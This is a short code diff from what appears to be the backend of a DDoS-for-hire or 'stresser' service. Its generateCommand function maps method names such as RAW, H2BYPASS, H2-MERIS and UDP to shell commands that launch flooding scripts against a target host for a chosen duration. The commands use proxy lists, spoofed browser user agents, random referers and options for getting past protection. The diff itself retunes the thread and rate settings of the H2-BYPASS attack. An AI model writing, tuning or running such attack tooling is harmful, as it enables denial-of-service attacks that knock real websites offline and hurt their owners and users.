@@ -34,7 +34,7 @@ const generateCommand = (method, host, port, time) => {
         case 'RAW':
             return `cd /root/methods && node Raw.js ${host} ${time}`;
         case 'H2BYPASS':
-            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 64 8 proxy.txt`;
+            return `cd /root/methods && node H2-BYPASS.js ${host} ${time} 32 10 proxy.txt`;
         case 'H2-MERIS':
             return `cd /root/methods && node H2-MERIS.js ${host} ${time} 4 64 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
         case 'UDP':
